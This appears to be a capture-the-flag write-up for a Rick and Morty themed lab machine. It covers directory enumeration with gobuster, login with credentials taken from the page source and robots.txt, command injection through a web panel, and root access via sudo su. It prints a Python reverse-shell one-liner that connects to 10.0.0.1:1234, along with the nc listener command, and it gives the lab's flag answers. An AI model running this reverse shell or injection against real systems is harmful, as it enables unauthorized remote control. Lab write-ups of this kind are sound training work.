# Steps to find the ingredients
- Page source of 10.10.57.239 shows user name as R1ckRul3s

- Ran Gobuster command: 

gobuster dir -u http://10.10.57.239 -w /usr/share/wordlists/dirb/common.txt -t 250 -x txt,php,js,html

Results:

Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.57.239
[+] Method:                  GET
[+] Threads:                 250
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,php,js,html
[+] Timeout:                 10s
===============================================================
2021/06/28 19:15:53 Starting gobuster in directory enumeration mode
===============================================================
/.hta.html            (Status: 403) [Size: 296]
/.hta                 (Status: 403) [Size: 291]
/.hta.txt             (Status: 403) [Size: 295]
/.hta.php             (Status: 403) [Size: 295]
/.hta.js              (Status: 403) [Size: 294]
/.htaccess            (Status: 403) [Size: 296]
/.htaccess.txt        (Status: 403) [Size: 300]
/.htaccess.php        (Status: 403) [Size: 300]
/.htaccess.js         (Status: 403) [Size: 299]
/.htaccess.html       (Status: 403) [Size: 301]
/.htpasswd            (Status: 403) [Size: 296]
/.htpasswd.js         (Status: 403) [Size: 299]
/.htpasswd.html       (Status: 403) [Size: 301]
/.htpasswd.txt        (Status: 403) [Size: 300]
/.htpasswd.php        (Status: 403) [Size: 300]
/assets               (Status: 301) [Size: 313] [--> http://10.10.57.239/assets/]
/denied.php           (Status: 302) [Size: 0] [--> /login.php]                   
/index.html           (Status: 200) [Size: 1062]                                 
/index.html           (Status: 200) [Size: 1062]                                 
/login.php            (Status: 200) [Size: 882]                                  
/portal.php           (Status: 302) [Size: 0] [--> /login.php]   
/robots.txt           (Status: 200) [Size: 17]                                   
/robots.txt           (Status: 200) [Size: 17]                                   
/server-status        (Status: 403) [Size: 300]      
- Checked the URL for http://10.10.57.239/robots.txt
Showed text Wubbalubbadubdub – possible password

- Checked http://10.10.57.239/login.php and logged in with:
Username: R1ckRul3s
Password: Wubbalubbadubdub

- Due to the command panel not allowing cat or echo commands, used the grep –R . command and checked the page source to find the one of the ingredients
Sup3rS3cretPickl3Ingred.txt: flag{mr. meeseek hair}

- Used to python command from PentestMonkey.net to inject a reverse shell into the command panel
Before running the shell, setup a listening port on 1234 using nc –lvnp 1234
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

- While logged into the shell, found the second ingredients file in /home/rick
Flag{1 jerry tear} 

- changed to a root user using the sudo su command, changed to root directory and found the flag in the 3rd.txt file
Flag{fleeb juice}
